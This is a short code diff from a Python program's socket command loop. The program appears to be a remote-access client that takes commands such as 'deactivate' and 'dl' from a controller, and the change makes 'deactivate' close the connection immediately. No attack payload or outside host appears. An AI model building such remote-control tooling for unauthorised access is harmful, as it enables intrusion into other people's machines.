@@ -105,9 +105,8 @@ while True:
       data = Receive(sock).decode()
 
       if data == 'deactivate':
-        Send(sock, 'Deactivated 🍺\n' + os.getcwd() + '>')
-        time.sleep(10)
         active = False
+        sock.close()
         break
 
       elif data.startswith('dl '):
